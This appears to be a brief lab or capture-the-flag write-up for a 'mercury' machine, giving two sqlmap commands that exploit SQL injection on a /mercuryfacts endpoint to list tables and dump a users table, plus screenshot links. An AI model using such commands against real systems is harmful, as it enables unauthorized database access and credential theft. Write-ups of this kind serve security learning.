# sqlmap
We found out in the http 8080 of the mercury machine had the /mercuryfacts directory and the /mercuryfacts/todo
directory which had mentioned about changing from direct mysql call to django for better security.  
- sqlmap -u "http://192.168.56.102:8080/mercuryfacts/1" --tables --batch  

Then all we had to do was perform sql injection and ask what we needed.  
I found out that there were 2 databases and dumbped the database data.  
- sqlmap -u "http://192.168.56.102:8080/mercuryfacts/1" -D mercury -T users --dump --batch  

1<img width="1920" height="903" alt="Screenshot_2025-10-06_03_51_09" src="https://github.com/user-attachments/assets/5a4be5a6-9d70-41bf-b11c-d53066549bc1" />
2<img width="1920" height="903" alt="Screenshot_2025-10-06_03_51_42" src="https://github.com/user-attachments/assets/1ebdbe66-daf1-45d5-9160-139f5e13f3e9" />
3<img width="1920" height="903" alt="Screenshot_2025-10-06_03_54_08" src="https://github.com/user-attachments/assets/a9d2f824-520e-40e3-8295-03a871f52cb9" />
4<img width="1920" height="903" alt="Screenshot_2025-10-06_03_54_58" src="https://github.com/user-attachments/assets/dfb79c39-5160-43e2-9d56-d750868129cf" />
5<img width="1920" height="903" alt="Screenshot_2025-10-06_03_55_07" src="https://github.com/user-attachments/assets/2cb72510-6255-47e9-bc61-0aaf4ef2c9bc" />





